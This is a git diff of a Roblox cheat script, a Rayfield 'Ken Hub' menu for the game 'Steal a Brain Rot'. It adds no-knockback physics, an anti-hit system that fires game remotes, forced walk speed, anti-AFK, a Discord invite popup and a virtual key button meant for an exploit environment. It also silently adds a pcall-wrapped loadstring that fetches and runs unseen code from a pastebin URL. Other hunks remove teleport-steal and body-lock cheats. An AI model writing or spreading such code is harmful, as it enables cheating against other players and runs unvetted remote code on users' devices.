@@ -1,14 +1,212 @@
+-- 👆 GUI appears BEFORE Rayfield loading UI starts
+
+task.defer(function()
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+
+    local player = Players.LocalPlayer
+    local PlayerGui = player:WaitForChild("PlayerGui")
+
+    local discordLink = "https://discord.gg/C5N4Y4cqqN"
+
+    local translations = {
+        ["en"] = { join = "Join our Discord!", copy = "Copy Link", copied = "Copied Discord Link!" },
+        ["ar"] = { join = "انضم إلى ديسكوردنا!", copy = "نسخ الرابط", copied = "تم نسخ رابط الديسكورد!" },
+        ["fil"] = { join = "Sumali sa aming Discord!", copy = "Kopyahin ang Link", copied = "Nai-copy ang Discord Link!" },
+        ["pt"] = { join = "Junte-se ao nosso Discord!", copy = "Copiar Link", copied = "Link do Discord copiado!" },
+        ["es"] = { join = "¡Únete a nuestro Discord!", copy = "Copiar enlace", copied = "¡Enlace de Discord copiado!" },
+        ["fr"] = { join = "Rejoignez notre Discord !", copy = "Copier le lien", copied = "Lien Discord copié !" },
+        ["ru"] = { join = "Присоединяйтесь к нашему Discord!", copy = "Скопировать ссылку", copied = "Ссылка Discord скопирована!" },
+    }
+
+    local locale = player.LocaleId:sub(1,2):lower()
+    local texts = translations[locale] or translations["en"]
+
+    local function rainbowColor(t)
+        local r = (math.sin(t) * 0.5 + 0.5)
+        local g = (math.sin(t + 2 * math.pi / 3) * 0.5 + 0.5)
+        local b = (math.sin(t + 4 * math.pi / 3) * 0.5 + 0.5)
+        return Color3.new(r, g, b)
+    end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "DiscordInviteGUI"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.DisplayOrder = 999
+    ScreenGui.Parent = PlayerGui
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 320, 0, 110)
+    Frame.Position = UDim2.new(0.5, -160, 0.05, 0)
+    Frame.BackgroundColor3 = Color3.fromRGB(54, 57, 63)
+    Frame.BackgroundTransparency = 1
+    Frame.BorderSizePixel = 0
+    Frame.AnchorPoint = Vector2.new(0.5, 0)
+    Frame.ClipsDescendants = true
+    Frame.Active = true
+    Frame.Draggable = true
+    Frame.ZIndex = 100
+    Frame.Parent = ScreenGui
+
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 20)
+
+    local Glow = Instance.new("Frame", Frame)
+    Glow.Size = UDim2.new(1, 14, 1, 14)
+    Glow.Position = UDim2.new(0, -7, 0, -7)
+    Glow.BackgroundTransparency = 1
+    Glow.ZIndex = 99
+
+    local GlowStroke = Instance.new("UIStroke", Glow)
+    GlowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    GlowStroke.Thickness = 4
+    GlowStroke.Transparency = 0
+    GlowStroke.Color = Color3.fromRGB(255, 0, 0)
+
+    Instance.new("UICorner", Glow).CornerRadius = UDim.new(0, 20)
+
+    local TitleLabel = Instance.new("TextLabel", Frame)
+    TitleLabel.Size = UDim2.new(1, -20, 0, 30)
+    TitleLabel.Position = UDim2.new(0, 10, 0, 10)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = texts.join
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextSize = 22
+    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    TitleLabel.TextTransparency = 1
+    TitleLabel.ZIndex = 101
+
+    local CopyButton = Instance.new("TextButton", Frame)
+    CopyButton.Size = UDim2.new(0, 150, 0, 45)
+    CopyButton.Position = UDim2.new(0.5, -75, 0, 55)
+    CopyButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CopyButton.TextSize = 18
+    CopyButton.Font = Enum.Font.GothamSemibold
+    CopyButton.Text = texts.copy
+    CopyButton.AutoButtonColor = true
+    CopyButton.BorderSizePixel = 0
+    CopyButton.BackgroundTransparency = 1
+    CopyButton.TextTransparency = 1
+    CopyButton.ZIndex = 101
+    Instance.new("UICorner", CopyButton).CornerRadius = UDim.new(0, 15)
+
+    TweenService:Create(Frame, TweenInfo.new(1), {BackgroundTransparency = 0.1}):Play()
+    TweenService:Create(TitleLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()
+    TweenService:Create(CopyButton, TweenInfo.new(1), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+
+    local start = tick()
+    game:GetService("RunService").Heartbeat:Connect(function()
+        local t = tick() - start
+        GlowStroke.Color = rainbowColor(t * 2)
+    end)
+
+    local function fadeOut()
+        TweenService:Create(Frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(TitleLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
+        TweenService:Create(CopyButton, TweenInfo.new(1), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+        task.delay(1, function()
+            ScreenGui:Destroy()
+        end)
+    end
+
+    CopyButton.MouseButton1Click:Connect(function()
+        if setclipboard then setclipboard(discordLink) end
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Discord",
+                Text = texts.copied,
+                Duration = 3,
+                Icon = "rbxassetid://13412031254"
+            })
+        end)
+        fadeOut()
+    end)
+
+    task.delay(10, fadeOut)
+end)
+
+-- GUI with Draggable Circular ImageButton to simulate pressing K key
+local ScreenGui = Instance.new("ScreenGui")
+local KButton = Instance.new("ImageButton")
+
+-- Parent GUI to CoreGui (requires exploit environment like Synapse)
+ScreenGui.Name = "KKeyGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- Configure circular image button (11% smaller than 78 → ~69px)
+KButton.Parent = ScreenGui
+KButton.Size = UDim2.new(0, 69, 0, 69)
+KButton.Position = UDim2.new(0, 40, 0.4, -34)
+KButton.BackgroundTransparency = 1
+KButton.Image = "rbxassetid://139349233430103"
+KButton.ScaleType = Enum.ScaleType.Fit
+KButton.ClipsDescendants = true
+
+-- Make it circular
+local corner = Instance.new("UICorner", KButton)
+corner.CornerRadius = UDim.new(1, 0)
+
+-- Draggable (supports both Mouse & Touch)
+local dragging = false
+local dragStart, startPos
+
+local function inputPosition(input)
+	return input.Position or input.TouchPosition or Vector2.zero
+end
+
+KButton.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = inputPosition(input)
+		startPos = KButton.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = inputPosition(input) - dragStart
+		KButton.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- Simulate pressing the K key
+KButton.MouseButton1Click:Connect(function()
+	local vim = game:GetService("VirtualInputManager")
+	vim:SendKeyEvent(true, Enum.KeyCode.K, false, game)  -- Key down
+	vim:SendKeyEvent(false, Enum.KeyCode.K, false, game) -- Key up
+end)
+
+
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 -- Create the main window
 local Window = Rayfield:CreateWindow({
-Name = "Steal a Brain Rot Destroyer v2 Zues Hub",
+Name = "Steal a Brain Rot Destroyer v2 Ken Hub",
 LoadingTitle = "made by ken_i",
 LoadingSubtitle = "Using Rayfield",
 ConfigurationSaving = { Enabled = true },
 Discord = { Enabled = false },
 KeySystem = false
 })
+
+pcall(function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/MWYTEiiy", true))()
+end)
 
 -- Services
 local Players = game:GetService("Players")
@@ -258,251 +456,267 @@ end)
 -- UI Setup
 local MainTab = Window:CreateTab("🎯 Main", 6034818371)
 -- Below your Rayfield window and MainTab setup
-local autoSwordEnabled = false
-local lastUsed = 0
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalPlayer = Players.LocalPlayer
 
--- Create the toggle
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local isHeavy = false
+local normalProps = {}
+local heavyDensity = 15
+
+-- Function to toggle heaviness
+local function setHeaviness(enable)
+	isHeavy = enable
+	local character = player.Character
+	if not character then return end
+
+	for _, part in ipairs(character:GetDescendants()) do
+		if part:IsA("BasePart") and not part.Massless then
+			if enable then
+				normalProps[part] = part.CustomPhysicalProperties or PhysicalProperties.new()
+				part.CustomPhysicalProperties = PhysicalProperties.new(
+					heavyDensity,
+					normalProps[part].Friction,
+					normalProps[part].Elasticity,
+					normalProps[part].FrictionWeight,
+					normalProps[part].ElasticityWeight
+				)
+			elseif normalProps[part] then
+				part.CustomPhysicalProperties = normalProps[part]
+			end
+		end
+	end
+end
+
+-- Reapply on respawn
+player.CharacterAdded:Connect(function(char)
+	character = char
+	normalProps = {}
+	if isHeavy then
+		setHeaviness(true)
+	end
+end)
+
+-- 💢 Rayfield Toggle for Less Knock Back
 MainTab:CreateToggle({
-Name = "🗡️Knock Back Arua Rainbow Sword",
-CurrentValue = false,
-Callback = function(enabled)
-autoSwordEnabled = enabled
-
--- Execute the remote once on toggle on
-if enabled then
-task.spawn(function()
-local args = { [1] = "Rainbowrath Sword" }
-local remote = ReplicatedStorage:FindFirstChild("Packages")
-:FindFirstChild("Net")
-:FindFirstChild("RF/CoinsShopService/RequestBuy")
-if remote then
-pcall(function()
-remote:InvokeServer(unpack(args))
-end)
-end
-end)
-end
-end,
+	Name = "💢 No Knock Back",
+	CurrentValue = false,
+	Callback = function(enabled)
+		setHeaviness(enabled)
+	end
 })
 
---// Services
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local Workspace = game:GetService("Workspace")
-local StarterGui = game:GetService("StarterGui")
-local TeleportService = game:GetService("TeleportService")
+local function runAntiHitScript()
+    local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local localPlayer = Players.LocalPlayer
 
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local root = character:WaitForChild("HumanoidRootPart")
-local random = Random.new()
+    local text = {
+        title = "Anti Hit System",
+        statusOn = "Anti Hit active for {time}s",
+        statusOff = "Use before steal",
+        toggleOn = "Enable",
+        close = "X",
+    }
 
--- Apply heaviness to character
-root.CustomPhysicalProperties = PhysicalProperties.new(500, 0.3, 0.5)
+    -- Remove existing GUI if present
+    local existingGui = localPlayer:FindFirstChild("PlayerGui"):FindFirstChild("AntiHitSystemGui")
+    if existingGui then existingGui:Destroy() end
 
--- GUI Setup
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "KensInstaSteal"
-gui.ResetOnSpawn = false
-gui.Enabled = false -- Controlled by toggle
+    -- Create AntiHit GUI
+    local AntiHitGui = Instance.new("ScreenGui")
+    AntiHitGui.Name = "AntiHitSystemGui"
+    AntiHitGui.ResetOnSpawn = false
+    AntiHitGui.Parent = localPlayer:WaitForChild("PlayerGui")
 
--- Frame
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 200, 0, 100)
-frame.Position = UDim2.new(1, -220, 0.4, 0)
-frame.AnchorPoint = Vector2.new(0, 0.5)
-frame.BackgroundTransparency = 1
-frame.Active = true
-frame.Draggable = true
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 220, 0, 90)
+    Frame.Position = UDim2.new(0, 20, 0.8, 0)
+    Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    Frame.BorderSizePixel = 0
+    Frame.AnchorPoint = Vector2.new(0, 1)
+    Frame.Parent = AntiHitGui
+    Frame.Active = true
+    Frame.Draggable = true
 
--- Container
-local container = Instance.new("Frame", frame)
-container.Size = UDim2.new(0, 190, 0, 90)
-container.Position = UDim2.new(0, 5, 0, 5)
-container.BackgroundColor3 = Color3.fromRGB(25, 0, 0)
-container.BorderSizePixel = 0
-Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)
-local stroke = Instance.new("UIStroke", container)
-stroke.Thickness = 2
-RunService.Heartbeat:Connect(function()
-	stroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-end)
+    local UIStroke = Instance.new("UIStroke", Frame)
+    UIStroke.Color = Color3.fromRGB(100, 100, 100)
+    UIStroke.Thickness = 1
 
--- Title
-local titleBar = Instance.new("TextLabel", container)
-titleBar.Size = UDim2.new(1, 0, 0, 25)
-titleBar.BackgroundTransparency = 1
-titleBar.Text = "Ken's"
-titleBar.Font = Enum.Font.GothamBold
-titleBar.TextColor3 = Color3.fromRGB(255, 100, 100)
-titleBar.TextScaled = true
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Size = UDim2.new(1, 0, 0, 25)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextSize = 18
+    TitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    TitleLabel.Text = text.title
+    TitleLabel.Parent = Frame
 
--- Button
-local button = Instance.new("TextButton", container)
-button.Size = UDim2.new(0.9, 0, 0, 40)
-button.Position = UDim2.new(0.05, 0, 0, 40)
-button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-button.Text = "⚡ Insta Steal"
-button.Font = Enum.Font.GothamBold
-button.TextColor3 = Color3.fromRGB(255, 100, 100)
-button.TextScaled = true
-button.BorderSizePixel = 0
-Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
-local buttonStroke = Instance.new("UIStroke", button)
-buttonStroke.Thickness = 2
-RunService.Heartbeat:Connect(function()
-	buttonStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-end)
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Position = UDim2.new(0, 10, 0, 35)
+    StatusLabel.Size = UDim2.new(1, -20, 0, 30)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Font = Enum.Font.Gotham
+    StatusLabel.TextSize = 16
+    StatusLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
+    StatusLabel.TextWrapped = true
+    StatusLabel.Text = text.statusOff
+    StatusLabel.Parent = Frame
 
--- Helpers
-local function getDeliveryHitbox()
-	local plots = Workspace:FindFirstChild("Plots")
-	if not plots then return end
-	for _, plot in pairs(plots:GetChildren()) do
-		local sign = plot:FindFirstChild("PlotSign")
-		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
-			return plot:FindFirstChild("DeliveryHitbox")
-		end
-	end
+    local ToggleButton = Instance.new("TextButton")
+    ToggleButton.Position = UDim2.new(0, 10, 0, 70)
+    ToggleButton.Size = UDim2.new(1, -20, 0, 20)
+    ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    ToggleButton.BorderSizePixel = 0
+    ToggleButton.Font = Enum.Font.GothamBold
+    ToggleButton.TextSize = 16
+    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ToggleButton.Text = text.toggleOn
+    ToggleButton.Parent = Frame
+
+    local function buyWebSlinger()
+        local remoteFunction = ReplicatedStorage.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
+        if remoteFunction then
+            local success, err = pcall(function()
+                remoteFunction:InvokeServer("Web Slinger")
+            end)
+            if not success then
+                warn("Failed to buy Web Slinger:", err)
+            end
+        else
+            warn("RemoteFunction RF/CoinsShopService/RequestBuy not found")
+        end
+    end
+
+    local function equipToolByName(toolName)
+        local character = localPlayer.Character
+        local backpack = localPlayer:FindFirstChild("Backpack")
+        if not character or not backpack then return nil end
+
+        local tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
+        if not tool then return nil end
+
+        tool.Parent = character
+
+        local handle = tool:FindFirstChild("Handle")
+        if handle then
+            handle.Transparency = 0
+        end
+
+        return tool
+    end
+
+    local function unequipAllExcept(toolName)
+        local character = localPlayer.Character
+        local backpack = localPlayer:FindFirstChild("Backpack")
+        if not character or not backpack then return end
+
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:UnequipTools()
+        end
+
+        for _, tool in ipairs(character:GetChildren()) do
+            if tool:IsA("Tool") and tool.Name ~= toolName then
+                tool.Parent = backpack
+            end
+        end
+    end
+
+    local function fireRemote(toolName)
+        unequipAllExcept(toolName)
+        local tool = equipToolByName(toolName)
+        if not tool then return end
+
+        task.wait(0.0065)
+
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChild("Humanoid")
+        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+        local arm = character and character:FindFirstChild("LeftLowerArm")
+        local handle = tool:FindFirstChild("Handle")
+
+        local remoteEvent = ReplicatedStorage.Packages.Net:FindFirstChild("RE/UseItem")
+        if arm and handle and remoteEvent then
+            remoteEvent:FireServer(character:GetPrimaryPartCFrame(), arm, handle)
+            task.delay(0.2, function()
+                if humanoid then humanoid.PlatformStand = false end
+                if rootPart then rootPart.Anchored = false end
+            end)
+        end
+    end
+
+    local toolName = nil
+    local countdownTask = nil
+
+    ToggleButton.MouseButton1Click:Connect(function()
+        if countdownTask then return end
+
+        fireRemote(toolName)
+
+        local total = 10
+        local start = os.clock()
+
+        countdownTask = task.spawn(function()
+            while true do
+                local timeLeft = math.max(0, total - (os.clock() - start))
+                StatusLabel.Text = text.statusOn:gsub("{time}", string.format("%.1f", timeLeft))
+                if timeLeft <= 0 then
+                    StatusLabel.Text = text.statusOff
+                    countdownTask = nil
+                    break
+                end
+                task.wait(0.1)
+            end
+        end)
+    end)
+
+    task.spawn(function()
+        while true do
+            local character = localPlayer.Character
+            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
+            if humanoid and humanoid.WalkSpeed ~= 50 then
+                humanoid.WalkSpeed = 50
+            end
+            task.wait(0.1)
+        end
+    end)
+
+    local function resetGuiTexts()
+        TitleLabel.Text = text.title
+        StatusLabel.Text = text.statusOff
+        ToggleButton.Text = text.toggleOn
+    end
+
+    localPlayer.CharacterAdded:Connect(function()
+        task.wait(2)
+        resetGuiTexts()
+    end)
+
+    buyWebSlinger()
+
+    local tries = 0
+    repeat
+        tries = tries + 1
+        task.wait(0.5)
+        local tool = localPlayer.Backpack:FindFirstChild("Web Slinger") or (localPlayer.Character and localPlayer.Character:FindFirstChild("Web Slinger"))
+        if tool then
+            toolName = tool.Name
+            break
+        end
+    until tries > 10
+
+    if not toolName then
+        warn("Web Slinger tool not found after purchase!")
+    end
 end
 
-local function getYourBaseSign()
-	local plots = Workspace:FindFirstChild("Plots")
-	if not plots then return end
-	for _, plot in pairs(plots:GetChildren()) do
-		local sign = plot:FindFirstChild("PlotSign")
-		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
-			return sign
-		end
-	end
-end
+-- Now create your Rayfield button exactly as you wanted:
 
-local function TP(cf)
-	if root then
-		root.CFrame = cf + Vector3.new(
-			random:NextNumber(-0.0001, 0.0001),
-			random:NextNumber(-0.0001, 0.0001),
-			random:NextNumber(-0.0001, 0.0001)
-		)
-	end
-end
-
--- Insta Steal Logic with temporary jump
-local function DeliverBrainrot()
-	local hitbox = getDeliveryHitbox()
-	if not hitbox then
-		warn("DeliveryHitbox not found")
-		return
-	end
-
-	local target = hitbox.CFrame * CFrame.new(0, -3, 0)
-	local voidCF = CFrame.new(0, -3.4028234663852886e+38, 0)
-
-	humanoid.WalkSpeed = 100000
-	local startTime = tick()
-	local teleporting = true
-
-	-- Only auto jump during teleport
-	local jumpConn = RunService.Heartbeat:Connect(function()
-		if teleporting then
-			humanoid.Jump = true
-		end
-	end)
-
-	local heartbeatConn
-	heartbeatConn = RunService.Heartbeat:Connect(function()
-		local elapsed = tick() - startTime
-
-		if elapsed < 2 then
-			TP(target)
-		elseif elapsed < 2.2 then
-			TP(voidCF)
-		elseif elapsed < 2.8 then
-			TP(voidCF)
-		elseif elapsed < 3 then
-			local sign = getYourBaseSign()
-			if sign then
-				TP(sign.CFrame * CFrame.new(0, 5, 0))
-			end
-		else
-			-- Cleanup
-			heartbeatConn:Disconnect()
-			jumpConn:Disconnect()
-			teleporting = false
-			humanoid.WalkSpeed = 16
-		end
-	end)
-end
-
--- Respawn detection + auto rejoin
-do
-	local rejoinTime = 3.3
-	local lowHealthDetected = false
-	local rejoinCancelled = false
-
-	local function startHealthCheck()
-		lowHealthDetected = false
-		rejoinCancelled = false
-
-		local conn
-		conn = humanoid.HealthChanged:Connect(function(hp)
-			if hp < 5 and not lowHealthDetected then
-				lowHealthDetected = true
-				rejoinCancelled = false
-				local startTime = tick()
-
-				task.spawn(function()
-					while tick() - startTime < rejoinTime do
-						if humanoid.Health >= 5 then
-							rejoinCancelled = true
-							break
-						end
-						task.wait(0.5)
-					end
-
-					if not rejoinCancelled then
-						StarterGui:SetCore("SendNotification", {
-							Title = "Perm death",
-							Text = "Rejoining...",
-							Duration = 5,
-							Icon = ""
-						})
-						TeleportService:Teleport(game.PlaceId, player)
-					end
-				end)
-			end
-		end)
-
-		player.CharacterAdded:Connect(function(newChar)
-			if conn then conn:Disconnect() end
-			humanoid = newChar:WaitForChild("Humanoid")
-			root = newChar:WaitForChild("HumanoidRootPart")
-			root.CustomPhysicalProperties = PhysicalProperties.new(500, 0.3, 0.5)
-			startHealthCheck()
-		end)
-	end
-
-	startHealthCheck()
-end
-
--- Button logic
-button.MouseButton1Click:Connect(function()
-	task.spawn(DeliverBrainrot)
-end)
-
--- Toggle control (needs to be inside your UI library setup)
-MainTab:CreateToggle({
-	Name = "⚡️Kens Instant Steal",
-	CurrentValue = false,
-	Flag = "KensInstantStealToggle",
-	Callback = function(state)
-		gui.Enabled = state
-	end,
+MainTab:CreateButton({
+    Name = "🤺 Activate Anti Hit System",
+    Callback = function()
+        runAntiHitScript()
+    end
 })
 
 -- Main heartbeat loop (runs each frame)
@@ -554,20 +768,6 @@ end
 end
 end)
 
-local bodyLockEnabled = false
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
--- Create the toggle button in MainTab
-MainTab:CreateToggle({
-Name = "🎯Body Lock Nearby Players",
-CurrentValue = false,
-Flag = "BodyLockToggle",
-Callback = function(state)
-bodyLockEnabled = state
-end,
-})
 
 --// Services
 local Players = game:GetService("Players")
@@ -581,7 +781,7 @@ local jumpBoostEnabled = false
 local infiniteJumpEnabled = false
 
 --// Settings
-local jumpBoostForce = 67
+local jumpBoostForce = 71
 local infiniteJumpMin = 45
 local infiniteJumpMax = 60
 local jumpCooldown = 0.05
@@ -661,184 +861,6 @@ MainTab:CreateToggle({
 		jumpBoostEnabled = state
 	end
 })
-
-
---// Services
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local UIS = game:GetService("UserInputService")
-
---// Create ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FuturisticGui"
-screenGui.Parent = playerGui
-screenGui.ResetOnSpawn = false
-screenGui.Enabled = false -- Start hidden until toggle is enabled
-
---// Main Draggable Frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 160, 0, 120)
-mainFrame.Position = UDim2.new(1, -170, 0.4, 0)
-mainFrame.AnchorPoint = Vector2.new(0, 0.5)
-mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-mainFrame.BorderSizePixel = 0
-mainFrame.BackgroundTransparency = 0
-mainFrame.Parent = screenGui
-mainFrame.Active = true
-mainFrame.Draggable = true
-
---// UI Stroke (blue glow)
-local stroke = Instance.new("UIStroke")
-stroke.Thickness = 2
-stroke.Color = Color3.fromRGB(0, 170, 255)
-stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-stroke.Parent = mainFrame
-
---// UI Corner (rounded edges)
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 10)
-corner.Parent = mainFrame
-
---// UIListLayout (for button stacking)
-local layout = Instance.new("UIListLayout")
-layout.Parent = mainFrame
-layout.SortOrder = Enum.SortOrder.LayoutOrder
-layout.Padding = UDim.new(0, 10)
-layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-layout.VerticalAlignment = Enum.VerticalAlignment.Center
-
---// Button creation function
-local function createFuturisticButton(text)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 140, 0, 45)
-    btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    btn.BorderSizePixel = 0
-    btn.Text = text
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 18
-    btn.TextColor3 = Color3.fromRGB(0, 170, 255)
-    btn.AutoButtonColor = false
-
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-
-    local btnStroke = Instance.new("UIStroke")
-    btnStroke.Thickness = 1.5
-    btnStroke.Color = Color3.fromRGB(0, 170, 255)
-    btnStroke.Transparency = 0.4
-    btnStroke.Parent = btn
-
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-        btnStroke.Transparency = 0
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-        btnStroke.Transparency = 0.4
-    end)
-
-    return btn
-end
-
---// Buttons
-local upButton = createFuturisticButton("⬆ Up")
-upButton.Parent = mainFrame
-
-local downButton = createFuturisticButton("⬇ Down")
-downButton.Parent = mainFrame
-
---// Variables
-local teleportHeight = 240
-local character = player.Character or player.CharacterAdded:Wait()
-local targetSize = Vector3.new(55.3507, 466.2961, 495.0706)
-local tolerance = 0.1
-
---// Utility Functions
-local function isSizeMatch(partSize, targetSize, tol)
-    return math.abs(partSize.X - targetSize.X) <= tol
-       and math.abs(partSize.Y - targetSize.Y) <= tol
-       and math.abs(partSize.Z - targetSize.Z) <= tol
-end
-
-local function findPartBySize()
-    for _, part in pairs(workspace:GetDescendants()) do
-        if part:IsA("BasePart") then
-            if isSizeMatch(part.Size, targetSize, tolerance) then
-                return part
-            end
-        end
-    end
-    return nil
-end
-
---// Button Functions
-local function teleportUp()
-    character = player.Character or player.CharacterAdded:Wait()
-    local root = character:FindFirstChild("HumanoidRootPart")
-    if root then
-        root.CFrame = root.CFrame + Vector3.new(0, teleportHeight, 0)
-    end
-end
-
-local function disableCollisionTemporarily()
-    local part = findPartBySize()
-    if part then
-        part.CanCollide = false
-        print("[Gui] Collision disabled on:", part.Name)
-        task.delay(3, function()
-            if part and part.Parent then
-                part.CanCollide = true
-                print("[Gui] Collision restored on:", part.Name)
-            end
-        end)
-    else
-        warn("[Gui] No matching part found.")
-    end
-end
-
---// Bind Button Events
-upButton.MouseButton1Click:Connect(teleportUp)
-downButton.MouseButton1Click:Connect(disableCollisionTemporarily)
-
---// Create Toggle Button in MainTab
-MainTab:CreateToggle({
-    Name = "🛠️ Up Down Steal Gui(PATCHED)",
-    CurrentValue = false,
-    Callback = function(enabled)
-        screenGui.Enabled = enabled
-    end
-})
-
-
--- Continuous loop: rotates your body each frame when toggle is on
-RunService.Heartbeat:Connect(function()
-if not bodyLockEnabled then return end
-
-local char = LocalPlayer.Character
-local hrp = char and char:FindFirstChild("HumanoidRootPart")
-if not hrp then return end
-
-local nearest, dist = nil, 30
-for _, p in ipairs(Players:GetPlayers()) do
-if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-local d = (hrp.Position - p.Character.HumanoidRootPart.Position).Magnitude
-if d <= dist then
-nearest, dist = p, d
-end
-end
-end
-
-if nearest then
-local targetHRP = nearest.Character.HumanoidRootPart
-hrp.CFrame = CFrame.lookAt(
-hrp.Position,
-Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z)
-)
-end
-end)
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -1427,6 +1449,33 @@ EspTab:CreateToggle({
 
 local UtilsTab = Window:CreateTab("🛠️ Utils", 6034818371)
 
+local vu = game:GetService("VirtualUser")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local antiAfkConnection = nil
+
+UtilsTab:CreateToggle({
+	Name = "🛡️ Anti-AFK",
+	CurrentValue = false,
+	Callback = function(enabled)
+		if enabled then
+			if not antiAfkConnection then
+				antiAfkConnection = player.Idled:Connect(function()
+					vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+					wait(1)
+					vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+				end)
+			end
+		else
+			if antiAfkConnection then
+				antiAfkConnection:Disconnect()
+				antiAfkConnection = nil
+			end
+		end
+	end
+})
+
 -- ðŸŸ¥ Then add the rest (GUI logic, etc.)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -1457,7 +1506,7 @@ end)
 
 -- ðŸ”˜ Toggle to control the Leave GUI
 UtilsTab:CreateToggle({
-	Name = "Toggle Leave GUI",
+	Name = "🚪Toggle Leave GUI",
 	CurrentValue = false,
 	Callback = function(state)
 		leaveGui.Enabled = state
@@ -1497,7 +1546,7 @@ end)
 
 -- Add toggle to UtilsTab to show/hide the Rejoin GUI
 UtilsTab:CreateToggle({
-	Name = "Toggle Rejoin GUI",
